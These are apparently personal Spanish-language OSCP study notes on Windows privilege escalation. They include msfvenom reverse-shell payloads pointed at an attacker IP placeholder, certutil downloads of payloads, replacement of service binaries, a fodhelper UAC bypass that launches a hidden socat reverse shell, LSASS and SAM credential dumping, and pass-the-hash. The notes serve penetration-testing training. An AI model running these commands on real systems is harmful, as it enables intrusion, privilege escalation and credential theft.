

## Si hay algún problema consultar el apartado de escalada de privilegio de windows de hacktricks

#### Insecure service permission ni regys entra en la OSCP

---

## Herramientas de utilidad

### PrintSpoofer

### god potato

### Lolbas

### Sysinternal tools

---

### Tipos de movimiento lateral

Win.exe
rdp
evil-winrm
pkexec

---
### Qué hacer si se nos rompe la shell

lo que hace es crearnos un usuario (podemos usar el programa que nos da el curso de offsec que tambien están en éste obsidian)

**msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe**

---
### Evil-winrm

***Podemos descargarnos ficheros***

```powershell
download nom_archivo_que_queramos nom_que_le_pongamos
```

***Maquina kali***

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_ATACANTE LPORT=53 -f exe -o reverse.exe

o

impacket-smbserver share /home/kali/ *poner -smb2support*
```


***Maquina Windows***

```powershell
copy \\IP_KALI\share\rev.exe
```

usar impacket para pasarnos cosas

![](../../img/Pasted%20image%2020260130184146.png)

con evil-winrm

![](Pasted%20image%2020260202190001.png)


---

## Escalda

### Herramientas

![](../../img/Pasted%20image%2020260130181114.png)

#### Herraminetas automatizadas

winpeas

#### Herraminetas "manuales"

PowerView

PowerUp -->  puedes hacer explotacion automatica es como winpeas pero resumido (Ojo cuidado con la explotación automatizada para la OSCP)

SharpUp --> es como PowerUp sin explotacion (usar mejor esta para la OSCP)

Accesschk.exe --> Comprueba que permisos tiene el usuario para parar procesos, modificat archivos...

Seatbelt.exe --> Ve procesos y binarios custom en el sistema

---
#### Comandos

Icacls --> Vemos los permisos que tenemos sobre un directorio o fichero
	R --> Leer
	X --> Ejecución
	W --> Escritura
	F --> Permisos completos

Findstr --> Como el grep

Reg query --> Es el comando de terminal que nos permite consultar las claves de registro y ver las que tenemos

Cmdkeys --> Comprueba las claves que hay del sistema para poder ejecutarlas como otro usuario

Whoami --> Vemos quienes somos y podemos complementarlas con los parámetros:

	/all --> Muestra todo el contenido del whoami
	/priv --> Muestra los privilegios que tenemos como usuario


---
### Vectores de escalada


Archivos con contraseña

Memoria local / Registry Hives: (SAM, SYSTEM, SOFTWARE, SECURITY, NTUSER.dat)(LSASS)


**Abuso de configuraciones** --> tienen más relevancia que en Linux

**Versiones desactualizada**


**Abusos en el registro**


**Abusos en los binarios**


---


### Winpeas


Podemos abusar si tiene NTLM desactivado

![](Pasted%20image%2020260202172855.png)


---

### Seimpersonate privilege


Tirar godpotato o cualquier potato
o
printspoofoing


1º hacemos un `whoami /all`

2º buscamos que esté habilitado el privilegio: `DelegateSessionUserImpersonatePrivilege`

3º Ejecutamos SigmaPotato (por ejemplo)

---

### Sedebug privilege


![](Pasted%20image%2020260202182058.png)



pasos a seguir


1º Mirar privilegios

2º Binario *procdump* a *lsass*

3º Abir el dump con mimikatz para mirar el log


![](Pasted%20image%2020260202182140.png)


para pasarnos las cosas con samba

![](Pasted%20image%2020260202184217.png)



---


### Unquoted service path


![](Pasted%20image%2020260202193701.png)


Cuando un servicio tiene asociado un servicio y una ruta

![](Pasted%20image%2020260203172753.png)

![](Pasted%20image%2020260203172821.png)

![](Pasted%20image%2020260203172907.png)


Pasos

wmic service get name, pathname,displayname,startmode | findstr -i auto | findstr -i -v

![](Pasted%20image%2020260202193735.png)


![](Pasted%20image%2020260202194651.png)


![](Pasted%20image%2020260202194908.png)


![](Pasted%20image%2020260202194926.png)


---


### Always install elevated

***No debería de entrar en la OSCP***


Nos permite ejecutar e installar con permisos del sistema 

![](Pasted%20image%2020260203173143.png)


**Hay que hacerlo en una reverse shell o dentro de la máquina sin evil-winrm**


reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated --> debe de salir 0x1 en el apartado de AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated --> tiene que ser un usuario del sistema



Nos creamos una shell

msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_ATACANTE LPORT=53 -f msi -o reverse.msi

Nos pasamos el archivo con certutil o impacket

```cmd
certutil -f -urlcache -split http://IP_ATACANTE/archivo_pasar
```

![](Pasted%20image%2020260203194203.png)

Ejecutamos el comando que nos permite ejecutar e instalar archivos msi con el modo *quiet*


Ponemos el puerto a la escucha en nuestra kali

msiexec /quiet /qn /i nom_shell.msi


![](Pasted%20image%2020260203173233.png)


---

### Búsqueda de credenciales


**Comandos para buscar contraseñas, hashes ntlm, rutas y qué hacer con ellos**

![](Pasted%20image%2020260203174221.png)


**Búsqueda en las entradas de registro del equipo**


![](Pasted%20image%2020260203174323.png)



![](Pasted%20image%2020260203174826.png)


![](Pasted%20image%2020260203174945.png)

---
#### Ver archivos Git



![](Pasted%20image%2020260203175052.png)



![](Pasted%20image%2020260203175330.png)



```shell
'(password|username|user|pass|key|token|secret|admin|login|credentials)'
```

---

### Credential Manager


Almacena y gestiona el usuario y contraseña de dominio/locales y ejecutar comandos como los 
otros usuarios con runas

```cmd
cmdkey /list #lista credenciales almacenadas
```

```cmd
runas /savecred /user:DOMAIN\USER"cmd.exe"
runas /savecred /user:lab.local
```


![](Pasted%20image%2020260205171234.png)



---

### Sebackup privilege


Otorga la capacidad de listar todo el sistema como usuario y realizar copias de seguridad de archivos


Para dumpear SAM y SYSTEM

extraer los hashes con secretsdump

y hacer un pass the hash con evil-winrm


***Dumpear system***

![](Pasted%20image%2020260205173114.png)

***Dumpear SAM***

```cmd
reg save HKLM\SAM SAM.sav
```

![](Pasted%20image%2020260205173206.png)

Podemos descargar con evil-winrm o con impacket-secretsdump entre otros

![](Pasted%20image%2020260205174018.png)


pass the hash


![](Pasted%20image%2020260205174903.png)




![](Pasted%20image%2020260205175026.png)


---


### Abusar del binario filepermservice.exe


***Máquina kali***

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_ATACANTE LPORT=PUERTO_ATACANTE -f exe -o nom_reverse.exe
```

```shell
impacket-smbserver share /home/kali
```

***Máquina Windows***

```cmd
copy \\IP_ATACANTE\nom_share
```

```cmd
copy /Y C:\ruta_reverse "C:\ruta_binario\binario.exe"
```

***Máquina Kali***

```shell
nc -nlvp 4444
```

***Máquina Windows***

```cmd
net start nom_servicio
```

---
### Set take ownership privilege


 #### ¿Qué es?

![](Pasted%20image%2020260205194450.png)


#### Explotación


1* whoami /priv  
2* takeown /f "C:\Users\Administrator\Desktop\nothing.xml"  
3* Comprobar privilegios icacls "C:\Users\Administrator\Desktop\nothing.xml"  
4* icacls "C:\Users\Administrator\Desktop\nothing.xml" /grant User1:f

takeown /f "C:\Users\Administrator\Desktop\nom.xml"

![](Pasted%20image%2020260205194654.png)


![](Pasted%20image%2020260205194805.png)

nos devolverá un código 64 que deberemos decodear


---


### DLL Hijacking


Se necesita una herramienta de administrador ya que usa una herramienta llamada process monitor

1º Necesitamos tener interfaz gráfica
2º Necesitamos ser administrador
3º Necesitamos que las herramientas no tengan permisos de administrador


![](Pasted%20image%2020260209181039.png)


Crean una dll para añadir un usuario en vez de crear una reverse shell (en el curso de la OSCP)


##### Explotación

1º Usamos winPEAS para localizar carpetas de exclusión (carpetas en las que tenemos permisos)

2º Comprobamos los privilegios del usuario sobre el servicio y las características del servicio

![](Pasted%20image%2020260209181401.png)


```cmd
qc dllsvc
```

![](Pasted%20image%2020260209182308.png)



#### Procmon

1º paramos la captura

![](Pasted%20image%2020260209182511.png)


2º llamamos la servicio o lo ejecutamos

![](Pasted%20image%2020260209184516.png)

3º Tenemos que buscar por el resultado como "NAME NOT FOUND" (podemos buscar tambien por la ruta que nos dé winPEAS)




Creamos una revshell que se llame igual que el dll que queremos robar

![](Pasted%20image%2020260209185105.png)


Nos lo pasamos con impacket

Y nos lo copiamos en el win

copiamos el dll malo al directorio temp

nos ponemos a la escucha en kali

activamos el dll (lo paramos y lo activamos en caso de que ya lo estuviera)


---
### UAC (User Access Control) BYPASS

Sólo sirve para administradores, sirve para saltarnos el control que nos pide verificarnos con user y contraseña al iniciar algo con privilegios

![](Pasted%20image%2020260210171701.png)


#### Lo que pasa cuando corremos como administrador

![](Pasted%20image%2020260210171747.png)


#### Cómo explotarlo de forma manual


fodhelper.exe=msconfig.exe

![](Pasted%20image%2020260210172134.png)



![](Pasted%20image%2020260210172947.png)



Buscamos la funcion autoelevated ya que no requiere un prompt para ejecutar como admin, lo hace directamente



![](Pasted%20image%2020260210173324.png)


*aquí se explota*

![](Pasted%20image%2020260210173343.png)


![](Pasted%20image%2020260210173437.png)



![](Pasted%20image%2020260210173600.png)


luego ejecutamos fodhelper.exe


### Cómo lo explotamos (sencillo)


**Necesitamos de entorno gráfico**

![](Pasted%20image%2020260210173922.png)


[Akagi.exe](https://github.com/hfiref0x/UACME) --> probar la 23 y la 33


### Explotación con msconfig


1º Abrimos msconfig --> win+R

![](Pasted%20image%2020260210182954.png)

2º con Procmon o con Process Hacker vemos si el proceso es calificado como high IL

![](Pasted%20image%2020260210182811.png)

3º Nos vamos a la pestaña de herramientas y seleccionamos ejecutar command prompt

![](Pasted%20image%2020260210183036.png)


### Explotación con azman.msc


1º Abrimos azman.msc --> win+R

![](Pasted%20image%2020260210183248.png)


2º Comprobamos si tiene privilegios altos el proceso con ProcessHacker o Procmon (hay que tener en cuenta que todos los archivos con extensión .msc corren a través de mmc.exe o Microsoft Management System Console)

![](Pasted%20image%2020260210183324.png)


3º  Nos iremos al apartado de ayuda

![](Pasted%20image%2020260210183433.png)


4º Miraremos la fuente

![](Pasted%20image%2020260210183456.png)


5º se nos abrirá un txt el cual lo abriremos con cmd.exe

![](Pasted%20image%2020260210183550.png)


### Auto-Elevating Process

Para que una aplicación pueda elevarse automáticamente, deben cumplirse algunos requisitos:

- El ejecutable debe estar firmado por el editor de Windows.

- El ejecutable debe estar contenido en un directorio de confianza, como %SystemRoot%/System32/ o %ProgramFiles%/.

Dependiendo del tipo de aplicación, pueden aplicarse requisitos adicionales:

Los archivos ejecutables (.exe) deben declarar el elemento autoElevate dentro de sus manifiestos. Para comprobar el manifiesto de un archivo, podemos utilizar sigcheck, una herramienta que se incluye en el paquete Sysinternals. Si comprobamos el manifiesto de msconfig.exe, encontraremos la propiedad autoElevate:


```cmd
sigcheck64.exe -m c:/Windows/System32/msconfig.exe
```


![](Pasted%20image%2020260210184506.png)


#### Explotando Fodhelper

Se puede explotar sin la necesidad de entorno gráfico

1º Comprobamos si tiene el autoElevate

```cmd
sigcheck64.exe -m c:/Windows/System32/msconfig.exe
```

2º Miramos el proceso con Procmon

![](Pasted%20image%2020260210194753.png)


3º Deberemos de estar en un usuario que pertenezca al grupo de administradores

4º Configuramos los valores de registro necesarios para asociar la clase ms-settings a una revshell. Utilizaremos los siguientes comandos para configurar las claves de registro necesarias desde cmd

```cmd
C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command

C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes" # aqui usamos socat, pero podemos usar una reverse shell con msfvenom y se hace igual pero referenciando a la shell

C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
The operation completed successfully.

C:\> reg add %REG_KEY% /d %CMD% /f
The operation completed successfully
```

5º Nos ponemos a la escucha en nuestra máquina kali en el puerto que hemos puesto

6º Ejecutamos *fodhelper.exe*

7º Para borrar lo que hemos realizado

```cmd
reg delete HKCU\Software\Classes\ms-settings\ /f
```

---

#### Tipos de defensa de Windows Defender


- String detection
- Heuristic Analysis
- Signature Detection
- Behavioural Detection

![](Pasted%20image%2020260211174528.png)


#### Contramedidas


![](Pasted%20image%2020260211174703.png)



#### AMSI


AMSI.dll son dos dll

![](Pasted%20image%2020260211175247.png)


#### Comando para deshabilitar el antivirus | AMSI bypass


**Checkear las notas de marco (no me dió tiempo a apuntarlo xd)

---

### Schedule jobs (crontabs de win)




![](Pasted%20image%2020260211180417.png)


Pueden realizar acciones como system32 o como user normal

#### Explotación

Vamos a la ruta de los crontabs y las miramos

```cmd
C:\Windows\System32\Tasks
C:\Windows\Tasks
```

Miramos el runas por si es system32

```cmd
schtasks /query /fo LIST /v
```


Sobrescribimos el contenido de la reverse al cron

***Podemos usar el toolkit nishang que es un toolkit***

**Ejemplo**

```powershell

```

![](Pasted%20image%2020260211181043.png)

---

### Lazagne

Usarlo junto con rubeus para sacar credenciales

podemos sacar credenciales de navegador


---

### Información que deberíamos de tener

![](Pasted%20image%2020260224172706.png)


---

## PSCredential object


![](Pasted%20image%2020260224182055.png)